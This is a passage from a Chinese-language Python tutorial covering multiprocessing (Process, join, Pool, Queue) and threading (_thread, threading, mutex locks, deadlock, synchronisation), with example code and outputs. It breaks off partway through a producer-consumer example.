为none\n\n\n1\n2\n3\n4\n5\n6\n\n\n使用以上的构造函数，可以构造出一个process对象，该对象有如下的几种实例方法：\n\n方法                描述\nis_alive()        如果p仍然运行，返回true\njoin（[timeout]）   等待进程p终止。timeout是可选的超时期限，进程可以被链接无数次，但如果连接自身则会出错\nrun()             进程启动时运行的方法。默认情况下，会调用传递给process构造函数的target。定义进程的另一种方法是继承process类并重新实现run()函数\nstart()           启动进程，这将运行代表进程的子进程，并调用该子进程中的run()函数\nterminate()       强制终止进程。如果调用此函数，进程p将被立即终止，同时不会进行任何清理动作。如果进程p创建了它自己的子进程，这些进程将变为僵尸进程。使用此方法时需要特别小心。如果p保存了一个锁或参与了进程间通信，那么终止它可能会导致死锁或i/o损坏\n\n创建进程的示例代码：\n\nfrom multiprocessing import process\n\ndef process_func():\n    print(\"子进程执行了\")\n    \nif __name__ == '__main__':\n    p = process(target=process_func)\n    print(\"父进程执行\")\n    print(\"子进程即将执行\")\n    p.start()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n创建带参数的进程示例代码：\n\nfrom multiprocessing import process\nimport os\nfrom time import sleep\n#创建子进程代码\ndef run_proc(name,age,**kwargs):\n    for i in range(5):\n        print('子进程运行中，参数name：%s,age:%d'%(name,age))\n        print('字典参数kwargs：',kwargs)\n        sleep(0.5)\n\nif __name__=='__main__':\n    print('主进程开始运行')\n    p=process(target=run_proc,args=('test',18),kwargs={'m':23})\n    print('子进程将要执行')\n    p.start()\n    \n    \n\"\"\"\n主进程开始运行\n子进程将要执行\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n子进程运行中，参数name：test,age:18\n字典参数kwargs： {'m': 23}\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\njoin的用法，join表示的等待一个进程结束运行。如果在主进程中调用了某个进程join方法，则会等子进程执行完成之后才会继续执行主进程。\n\nfrom multiprocessing import process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = process(target = worker, args = (3,))\n    p.start()\n    #等待进程p终止\n    p.join()\n    print(\"主进程结束!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njoin中的参数可以添加一个超时时间，如果超过这个时间就不继续等待了。\n\nfrom multiprocessing import process\nfrom time import sleep\ndef worker(interval):\n    print(\"work start\");\n    sleep(interval)\n    print(\"work end\");\n\nif __name__ == \"__main__\":\n    p = process(target = worker, args = (5,))\n    p.start()\n    #等待进程p终止\n    p.join(3)\n    print(\"主进程结束!\")\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nprocess对象的实例属性如下表所示：\n\n属性     描述\nname   进程的名称\npid    进程的整数进程id\n\n示例代码：\n\n#导入模块\nimport multiprocessing\nimport time\n#定义进程执行函数\ndef clock(interval):\n    for i in range(5):\n        print('当前时间为{0}：'.format(time.ctime()))\n        time.sleep(interval)\nif __name__=='__main__':\n    #创建进程\n    p=multiprocessing.process(target=clock,args=(1,))\n    #启动进程\n    p.start()\n    p.join()\n    #获取进程的id\n    print('p.id:',p.pid)\n    #获取进程的名称\n    print('p.name:',p.name)\n    #判断进程是否运行\n    print('p.is_alive:',p.is_alive())\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n创建多个函数进程：\n\n#导入模块\nimport multiprocessing\nimport time\n#创建进程调用函数\ndef work1(interval):\n    print('work1')\n    time.sleep(interval)\n    print('end work1')\ndef work2(interval):\n    print('work2')\n    time.sleep(interval)\n    print('end work2')\ndef work3(interval):\n    print('work3')\n    time.sleep(interval)\n    print('end work3')\nif __name__=='__main__':\n    #创建进程对象\n    p1=multiprocessing.process(target=work1,args=(4,))\n    p2=multiprocessing.process(target=work2,args=(3,))\n    p3=multiprocessing.process(target=work3,args=(2,))\n    #启动进程\n    p1.start()\n    p2.start()\n    p3.start()\n    p1.join()\n    p2.join()\n    p3.join()\n    print('主进程结束')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 继承process方式创建进程\n\n创建进程的方式还可以使用类的方式，可以自定义一个类，继承process类，每次实例化这个类的时候，就等同于实例化一个进程对象。\n\n#导入模块\nfrom multiprocessing import process\nimport time\n#定义线程类\nclass clockprocess(process):\n    def __init__(self,interval):\n        process.__init__(self)\n        self.interval=interval\n    def run(self):\n        print('子进程开始执行的时间:{}'.format(time.ctime()))\n        time.sleep(self.interval)\n        print('子进程结束的时间:{}'.format(time.ctime()))\n\nif __name__=='__main__':\n    #创建进程\n    p=clockprocess(2)\n    #启动进程\n    p.start()\n    p.join()\n    print('主进程结束')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 进程池\n\n在利用python进行系统管理的时候，特别是同时操作多个文件目录，或者远程控制多台主机，并行操作可以节约大量的时间。当被操作对象数目不大时，可以直接利用multiprocessing中的process动态成生多个进程，十几个还好，但如果是上百个，上千个目标，手动的去限制进程数量却又太过繁琐，此时可以发挥进程池的功效。\n\npool可以提供指定数量的进程，供用户调用，当有新的请求提交到pool中时，如果池还没有满，那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到规定最大值，那么该请求就会等待，直到池中有进程结束，才会创建新的进程。pool的语法格式如下：\n\npool（[numprocess [, initializer [, initargs]]]）\n# numprocess 进程个数 如果如果省略 则使用cpu_count()的值\n# initializer每个工作进程启动时要调用的对象\n# initargs 调用进程时的参数\n\n\n1\n2\n3\n4\n\n\npool类有如下的实例方法：\n\n方法                                                    描述\napply（func [,args [,kwargs]]）                         在一个池工作进程中执行函数（*args，**kwargs），然后返回结果。\napply_async（func [, args [,kwargs [,callback ] ] ]）   在一个池工作进程中异步地执行函数（*args，**kwargs），然后返回结果。此方法的结果是asyncresult类的实例，稍后可用于获得最终结果。callback是可调用对象，接受输入参数。当func的结果变为可用时，将立即传递给callback。callback禁止执行任何阻塞操作，否则将阻塞接收其他异步操作中的结果\nclose()                                               关闭进程池，防止进行进一步操作。如果还有挂起的操作，它们将在工作进程终止之前完成\njoin()                                                等待所有工作进程退出。此方法只能在close（）或者terminate（）方法之后调用\nimap( func，iterable [ ,chunksize] )                   map（）函数的版本之一，返回迭代器而非结果列表\nimap_unordered( func，iterable [，chunksize] )          同imap（）函数一样，只是结果的顺序根据从工作进程接收到的时间任意确定\nmap( func，iterable [，chunksize] )                     将可调用对象func应用给iterable中的所有项，然后以列表的形式返回结果。通过将iterable划分为多块并将工作分派给工作进程，可以并行地执行这项操作。chunksize指定每块中的项数。如果数量较大，可以增大chunksize的值来提升性能\nmap_async( func，iterable [，chunksize [，callback]] )   同map（）函数，但结果的返回是异步的。返回值是asyncresult类的实例，稍后可用与获取结果。callback是指接受一个参数的可调对象。如果提供callable，当结果变为可用时，将使用结果调用callable\nterminate()                                           立即终止所有工作进程，同时不执行任何清理或结束任何挂起工作。如果p被垃圾回收，将自动调用此函数\nget( [ timeout] )                                     返回结果，如果有必要则等待结果到达。timeout是可选的超时。如果结果在指定时间内没有到达，将引发multiprocessing.timeouterror异常。如果远程操作中引发了异常，它将在调用此方法时再次被引发\nready()                                               如果调用完成，则返回true\nsucessful()                                           如果调用完成且没有引发异常，返回true。如果在结果就绪之前调用此方法，将引发assertionerror异常\nwait( [timeout] )                                     等待结果变为可用。timeout是可选的超时\n\n创建非阻塞的进程池：\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"end：\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #维持执行的进程总数为processes，当一个进程执行完毕后会添加新的进程进去\n        pool.apply_async(func, (msg, ))\n\n    pool.close()#进程池关闭之后不再接收新的请求\n    #调用join之前，先调用close函数，否则会出错。\n    # 执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束\n    pool.join()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n阻塞的进程池：\n\nimport multiprocessing\nimport time\n\ndef func(msg):\n    print(\"start:\", msg)\n    time.sleep(3)\n    print(\"end\",msg)\n\nif __name__ == \"__main__\":\n    pool = multiprocessing.pool(processes = 3)\n    for i in range(5):\n        msg = \"hello %d\" %(i)\n        #维持执行的进程总数为processes，当一个进程执行完毕后会添加新的进程进去\n        pool.apply(func, (msg, ))\n\n    pool.close()\n    #调用join之前，先调用close函数，否则会出错。\n    # 执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束\n    # pool.join()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 进程间的通信\n\n全局变量在多个进程中不共享，进程之间的数据是独立的，默认情况下互不影响。\n\n多个进程中的数据不共享：\n\nfrom multiprocessing import process\nnum=1\ndef work1():\n    global num\n    num+=5\n    print('子进程1运行，num:',num)\n\ndef work2():\n    global num\n    num += 10\n    print('子进程2运行，num：',num)\n\nif __name__=='__main__':\n    print('父进程开始运行')\n    p1=process(target=work1)\n    p2=process(target=work2)\n    p1.start()\n    p2.start()\n    p1.join()\n    p2.join()\n\"\"\"\n父进程开始运行\n子进程1运行，num: 6\n子进程2运行，num： 11\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\nqueue是多进程安全的队列，可以使用queue实现多进程之间的数据传递。put方法用以插入数据到队列中，put方法还有两个可选参数：blocked和timeout。如果blocked为true（默认值），并且timeout为正值，该方法会阻塞timeout指定的时间，直到该队列有剩余的空间。如果超时，会抛出queue.full异常。如果blocked为false，但该queue已满，会立即抛出queue.full异常。\n\nget方法可以从队列读取并且删除一个元素。同样，get方法有两个可选参数：blocked和timeout。如果blocked为true（默认值），并且timeout为正值，那么在等待时间内没有取到任何元素，会抛出queue.empty异常。如果blocked为false，有两种情况存在，如果queue有一个值可用，则立即返回该值，否则，如果队列为空，则立即抛出queue.empty异常。\n\nqueue的实例方法：\n\n方法                                 描述\ncancle_join_thread()               不会在进程退出时自动连接后台线程。这可以防止join_thread()方法阻塞\nclose()                            关闭队列，防止队列中加入更多数据。调用此方法时，后台线程将继续写入那些已入队列尚未写入数据，但将在此方法完成时马上关闭\nempty()                            如果调用此方法时q为空，返回true\nfull()                             如果q已满，返回true\nget([block [,timeout])             返回q中的一个项。如果q为空，此方法将阻塞，直到队列中有项可用为止。block用于控制阻塞行为，默认为true。如果设置为false，将引发queue.empty异常(定义在queue模块中)。timeout是可选超时时间，用在阻塞模式中。如果在指定的时间间隔内没有项变为可用，将引发queue.empty异常\njoin_thread()                      连接队列的后台线程。此方法用于在调用q.close()方法之后，等待所有队列项被消耗。默认情况下此方法由不是q的原始创建者的所有进程调用。调用q.cancle_join_thread()方法可以禁止这种行为\nput(item [ , block [, timeout]])   将item放入队列。如果队列已满，此方法将阻塞至有空间可用为止。block控制阻塞行为，默认为true。如果设置为false，将引发queue.empty异常(定义在queue模块中)。timeout指定在阻塞模式中等待可用时空间的时间长短。超时后将引发queue.full异常。\nqsize()                            返回目前队列中项的正确数量。\njoinablequeue([maxsize])           创建可连接的共享进程队列。这就像是一个queue对象，但队列允许项的消费者通知生产者项已经被成功处理。通知进程是使用共享的信号和条件变量来实现的\ntask_done()                        消费者使用此方法发出信号，表示q.get()返回的项已经被处理。如果调用此方法的次数大于从队列中删除的项的数量，将引发valueerror异常\njoin()                             生产者使用此方法进行阻塞，知道队列中的所有项均被处理。阻塞将持续到位队列中的每个项均调用q.task_done()方法为止\n\n使用方法：\n\nfrom multiprocessing import queue\nq=queue(3)\nq.put('消息1')\nq.put('消息2')\nprint('消息队列是否已满：',q.full())\nq.put('消息3')\nprint('消息队列是否已满：',q.full())\n\n# q.put('消息4')因为消息队列已满，需要直接写入需要等待，如果超时会抛出异常，\n# 所以写入时候需判断，消息队列是否已满\nif not q.full():\n    q.put('消息4')\n\n#同理读取消息时，先判断消息队列是否为空，再读取\nif not q.empty():\n    for i in range(q.qsize()):\n        print(q.get())\n        \n\"\"\"\n消息队列是否已满： false\n消息队列是否已满： true\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n实现进程间的通信方法：\n\nfrom multiprocessing import *\nimport time\ndef write(q):\n    #将列表中的元素写入队列中\n    for i in [\"a\",\"b\",\"c\"]:\n        print('开始写入值%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#读取\ndef read(q):\n    print('开始读取')\n    while true:\n        if not q.empty():\n            print('读取到:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #创建队列\n    q=queue()\n    #创建写入进程\n    pw=process(target=write,args=(q,))\n    pr=process(target=read,args=(q,))\n    #启动进程\n    pw.start()\n    pw.join()\n    pr.start()\n    pr.join()\n    \n\"\"\"\n开始写入值a\n开始写入值b\n开始写入值c\n开始读取\n读取到: a\n读取到: b\n读取到: c\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n如果使用pool创建进程，就需要使用multiprocessing.manager()中的queue()来完成进程间的通信，而不是multiprocessing.queue()，否则会抛出如下异常。\n\nruntimeerror: queue objects should only be shared between processes through inheritance\n\n创建进程池，完成进程间的通信：\n\nfrom multiprocessing import manager,pool\nimport time\ndef write(q):\n    #将列表中的元素写入队列中\n    for i in [\"a\",\"b\",\"c\"]:\n        print('开始写入值%s' % i)\n        q.put(i)\n        time.sleep(1)\n\n#读取\ndef read(q):\n    print('开始读取')\n    while true:\n        if not q.empty():\n            print('读取到:',q.get())\n            time.sleep(1)\n        else:\n            break\nif __name__=='__main__':\n    #创建队列\n    q=manager().queue()\n    #创建进程池\n    p=pool(3)\n    #使用阻塞模式创建进程\n    p.apply(write,(q,))\n    p.apply(read,(q,))\n    p.close()\n    p.join()\n\n\"\"\"\n开始写入值a\n开始写入值b\n开始写入值c\n开始读取\n读取到: a\n读取到: b\n读取到: c\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# 线程\n\n线程也是实现多任务的一种方式，一个进程中，也经常需要同时做多件事，就需要同时运行多个子任务，这些子任务就是线程。一个进程可以拥有多个并行的线程，其中每一个线程，共享当前进程的资源。\n\n区别     进程                                线程\n根本区别   作为资源分配的单位                         调度和执行的单位\n开销     每一个进程都有独立的代码和数据空间，进程间的切换会有较大的开销   线程可以看出是轻量级的进程，多个线程共享内存，线程切换的开销小\n所处环境   在操作系统中，同时运行的多个任务                  在程序中多个顺序流同时执行\n分配内存   系统在运行的时候为每一个进程分配不同的内存区域           线程所使用的资源是他所属进程的资源\n包含关系   一个进程内可以拥有多个线程                     线程是进程的一部分，所有线程有时候称为是轻量级的进程\n\n进程和线程在使用上各有优缺点：线程执行开销小，但不利于资源的管理和保护，而进程正相反。\n\n在python程序中，可以通过“_thread”和threading（推荐使用）这两个模块来处理线程。在python3中，thread模块已经废弃。可以使用threading模块代替。所以，在python3中不能再使用thread模块，但是为了兼容python3以前的程序，在python3中将thread模块重命名为“_thread”。\n\n\n# _thread模块\n\n在python程序中，可以通过两种方式来使用线程：使用函数或者使用类来包装线程对象。当使用thread模块来处理线程时，可以调用里面的函数start_new_thread()来生成一个新的线程，语法格式如下：\n\n_thread.start_new_thread ( function, args[, kwargs] )\n# function是线程函数\n# args表示传递给线程函数的参数\n# kwargs 是可选参数\n\n\n1\n2\n3\n4\n\n\n创建线程示例代码：\n\nimport _thread\nimport time\ndef fun1():\n    print('开始运行fun1')\n    time.sleep(4)\n    print('运行fun1结束')\ndef fun2():\n    print('开始运行fun2')\n    time.sleep(2)\n    print('运行fun2结束')\nif __name__=='__main__':\n    print('开始运行')\n    #启动一个线程运行函数fun1\n    _thread.start_new_thread(fun1,())\n     #启动一个线程运行函数fun2\n    _thread.start_new_thread(fun2,())\n    time.sleep(6)\n\"\"\"\n开始运行\n开始运行fun1\n开始运行fun2\n运行fun2结束\n运行fun1结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n从程序运行结果可以看出，在fun2函数中调用了sleep函数休眠，当休眠期间，会释放cpu的计算资源，这时fun1抢占了cpu资源开始执行。\n\n带参数的线程示例代码：\n\nimport _thread\nimport time\ndef fun1(thread_name,delay):\n    print('线程{0}开始运行fun1'.format(thread_name))\n    time.sleep(delay)\n    print('线程{0}运行fun1结束'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('线程{0}开始运行fun2'.format(thread_name))\n    time.sleep(2)\n    print('线程{0}运行fun2结束'.format(thread_name))\nif __name__=='__main__':\n    print('开始运行')\n    #启动一个线程运行函数fun1\n    _thread.start_new_thread(fun1,('thread-1',4))\n     #启动一个线程运行函数fun2\n    _thread.start_new_thread(fun2,('thread-2',2))\n    time.sleep(6)\n\"\"\"\n开始运行\n线程thread-1开始运行fun1\n线程thread-2开始运行fun2\n线程thread-2运行fun2结束\n线程thread-1运行fun1结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n从输出结果可以看出，由于每个线程函数的休眠时间可能都不相同，所以随机输出了这个结果，每次运行程序，输出的结果是不一样的。\n\n\n# threading模块\n\npython3 通过两个标准库 _thread 和 threading 提供对线程的支持。_thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。\n\nthreading 模块除了包含_thread 模块中的所有方法外，还提供的其他方法：\n\n * threading.currentthread(): 返回当前的线程变量。\n * threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。\n * threading.activecount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。\n\n在python3程序中，对多线程支持最好的是threading模块，使用这个模块，可以灵活地创建多线程程序，并且可以在多线程之间进行同步和通信。在python3程序中，可以通过如下两种方式来创建线程：\n\n * 通过threading.thread直接在线程中运行函数\n * 通过继承类threading.thread来创建线程\n\n在python中使用threading.thread的基本语法格式如下所示：\n\nthread(group=none, target=none, name=none, args=(), kwargs={})\n\n\n1\n\n\nthread类的成员方法：\n\n方法名            描述\nrun()          用以表示线程活动的方法\nstart()        启动线程活动\njoin([time])   等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生\nisalive()      返回线程是否活动的\ngetname()      返回线程名\nsetname()      设置线程名\n\n创建线程的示例代码：\n\nimport threading\nimport time\ndef fun1(thread_name,delay):\n    print('线程{0}开始运行fun1'.format(thread_name))\n    time.sleep(delay)\n    print('线程{0}运行fun1结束'.format(thread_name))\ndef fun2(thread_name,delay):\n    print('线程{0}开始运行fun2'.format(thread_name))\n    time.sleep(delay)\n    print('线程{0}运行fun2结束'.format(thread_name))\nif __name__=='__main__':\n    print('开始运行')\n    #创建线程\n    t1=threading.thread(target=fun1,args=('thread-1',2))\n    t2=threading.thread(target=fun2,args=('thread-2',4))\n    t1.start()\n    t2.start()\n\"\"\"\n开始运行\n线程thread-1开始运行fun1\n线程thread-2开始运行fun2\n线程thread-1运行fun1结束\n线程thread-2运行fun2结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在python中，通过继承类threading.thread的方式来创建一个线程。这种方法只要重写类threading.thread中的方法run()，然后再调用方法start()就能创建线程，并运行方法run()中的代码。\n\n继承thread类创建线程：\n\nimport threading\nimport time\ndef fun1(delay):\n    print('线程{0}开始运行fun1'.format(threading.current_thread().name))\n    time.sleep(delay)\n    print('线程{0}运行fun1结束'.format(threading.current_thread().name))\ndef fun2(delay):\n    print('线程{0}开始运行fun2'.format(threading.current_thread().name))\n    time.sleep(2)\n    print('线程{0}运行fun2结束'.format(threading.current_thread().name))\n#创建线程类继承threading.thread\nclass mythread(threading.thread):\n    #重写父类的构造方法，其中func是线程函数，args是传入线程的参数,name是线程名\n    def __init__(self,func,name,args):\n        super().__init__(target=func,name=name,args=args)\n    #重写父类的run()方法\n    def run(self):\n        self._target(*self._args)\n\nif __name__=='__main__':\n    print('开始运行')\n    #创建线程\n    t1=mythread(fun1,'thread-1',(2,))\n    t2=mythread(fun2,'thread-2',(4,))\n    t1.start()\n    t2.start()\n\n\"\"\"\n开始运行\n线程thread-1开始运行fun1\n线程thread-2开始运行fun2\n线程thread-1运行fun1结束\n线程thread-2运行fun2结束\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n在调用thread类的构造方法时，需要将线程函数、参数等值传入构造方法，其中name表示线程的名字，如果不指定这个参数，默认的线程名字格式为thread-1、thread-2。每一个传入构造方法的参数值，在thread类中都有对应的成员变量保存这些值，这些成员变量都以下划线(_)开头，如果_target、_args等。在run方法中需要使用这些变量调用传入的线程函数，并为线程函数传递参数。\n\n\n# 线程共享全局变量\n\n在一个进程内所有线程共享全局变量，多线程之间的数据共享比多进程要好。但是可能造成多个进程同时修改一个变量（即线程非安全），可能造成混乱。\n\n线程之间的全局变量可共享：\n\nimport time\nfrom threading import *\n#定义全局变量num\nnum=10\ndef test1():\n    global num\n    for i in range(3):\n        num+=1\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t1.join()\n    t2.start()\n    t2.join()\n\n\"\"\"\ntest1输出num: 13\ntest2输出num: 13\n\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n线程之间的全局变量共享存在的问题：\n\nimport time\nfrom threading import *\n#定义全局变量num\nnum=0\ndef test1():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        num+=1\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1输出num: 196538\ntest2输出num: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 锁\n\n\n# 互斥锁\n\n如果多个线程共同对某个数据修改，则可能出现不可预料的结果，为了保证数据的正确性，需要对多个线程进行同步。最简单的同步机制就是引入互斥锁。\n\n锁有两种状态——锁定和未锁定。某个线程要更改共享数据时，先将其锁定，此时资源的状态为“锁定”，其他线程不能更改；直到该线程释放资源，将资源的状态变成“非锁定”状态，其他的线程才能再次锁定该资源。互斥锁保证了每次只有一个线程进行写入操作，从而保证了多线程情况下数据的正确性。\n\n使用 thread 对象的 lock 可以实现简单的线程同步，有上锁 acquire 方法和 释放release 方法，对于那些需要每次只允许一个线程操作的数据，可以将其操作放到 acquire 和 release 方法之间。\n\n互斥锁的示例代码：\n\nimport time\nfrom threading import thread,lock\n#定义全局变量num\nnum=0\n#创建一把互斥锁\nmutex=lock()\ndef test1():\n    global num\n    '''\n    在两个线程中都调用上锁的方法，则这两个线程就会抢着上锁，\n    如果有1方成功上锁，那么导致另外一方会堵塞（一直等待）直到这个锁被解开\n    '''\n    mutex.acquire()#上锁\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    mutex.acquire()  # 上锁\n    for i in range(100000):\n        num+=1\n    mutex.release()\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\n\"\"\"\ntest1输出num: 100000\ntest2输出num: 200000\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n互斥锁的问题优化：\n\nimport time\nfrom threading import thread,lock\n#定义全局变量num\nnum=0\n#创建一把互斥锁\nmutex=lock()\ndef test1():\n    global num\n    '''\n    在两个线程中都调用上锁的方法，则这两个线程就会抢着上锁，\n    如果有1方成功上锁，那么导致另外一方会堵塞（一直等待）直到这个锁被解开\n    '''\n    for i in range(100000):\n        mutex.acquire()  # 上锁\n        num+=1\n        mutex.release()\n    print('test1输出num:',num)\n\ndef test2():\n    global num\n    for i in range(100000):\n        mutex.acquire()  # 上锁\n        num+=1\n        mutex.release()\n    print('test2输出num:',num)\n\nif __name__=='__main__':\n    t1=thread(target=test1)\n    t2=thread(target=test2)\n    t1.start()\n    t2.start()\n    t1.join()\n    t2.join()\n\n\"\"\"\ntest1输出num: 169163\ntest2输出num: 200000\n\"\"\"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 死锁\n\n在线程共享多个资源的时候，如果两个线程分别占有一部分资源并且同时等待对方的资源，就会造成死锁。\n\nimport time\nfrom threading import thread,lock\nimport threading\nmutexa=threading.lock()\nmutexb=threading.lock()\nclass mythread1(thread):\n    def run(self):\n        if mutexa.acquire():\n            print(self.name,'执行')\n            time.sleep(1)\n            if mutexb.acquire():\n                print(self.name,'执行')\n                mutexb.release()\n            mutexa.release()\n\n\nclass mythread2(thread):\n    def run(self):\n        if mutexb.acquire():\n            print(self.name,'执行')\n            time.sleep(1)\n            if mutexa.acquire():\n                print(self.name,'执行')\n                mutexa.release()\n            mutexb.release()\n\nif __name__ == '__main__':\n    t1=mythread1()\n    t2=mythread2()\n    t1.start()\n    t2.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n\n\n# 线程同步\n\n同步就是协同步调，按预定的先后次序进行运行。例如：开会。“同”字指协同、协助、互相配合。\n\n如进程、线程同步，可以理解为进程或线程a和b一块配合，a执行到一定程度时要依靠b的某个结果，于是停下来，示意b运行，b运行后将结果给a，a继续运行。\n\nimport time\nfrom threading import thread,lock\nimport threading\nlock1=lock()\nlock2=lock()\nlock3=lock()\nlock2.acquire()\nlock3.acquire()\nclass task1(thread):\n    def run(self):\n        while true:\n            if lock1.acquire():\n                print('...task1...')\n                time.sleep(1)\n                lock2.release()\n\nclass task2(thread):\n    def run(self):\n        while true:\n            if lock2.acquire():\n                print('...task2...')\n                time.sleep(1)\n                lock3.release()\n\nclass task3(thread):\n    def run(self):\n        while true:\n            if lock3.acquire():\n                print('...task3...')\n                time.sleep(1)\n                lock1.release()\n\nif __name__ == '__main__':\n    t1=task1()\n    t2=task2()\n    t3=task3()\n    t1.start()\n    t2.start()\n    t3.start()\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 生产者和消费者模式\n\n生产者就是生产数据的线程，消费者就是消费数据的线程。在多线程开发当中，如果生产者处理速度很快，而消费者处理速度很慢，那么生产者就必须等待消费者处理完，才能继续生产数据。同样的道理，如果消费者的处理能力大于生产者，那么消费者就必须等待生产者。为了解决这个问题于是引入生产者和消费者模式\n\n生产者消费者模式通过一个容器来解决生产者和消费者的强耦合问题。生产者和消费者之间不直接通信。生产者生产商品，然后将其放到类似队列的数据结构中，消费者不找生产者要数据，而是直接从队列中取。这里使用queue模块来提供线程间通信的机制，也就是说，生产者和消费者共享一个队列。生产者生产商品后，会将商品添加到队列中。消费者消费商品，会从队列中取出商品。\n\n生产者和消费者模型示例代码：\n\nimport time\nimport threading\nfrom queue import queue\nclass producer(threading.thread):\n    def run(self):\n        global queue\n        count=0\n        while true:\n            if 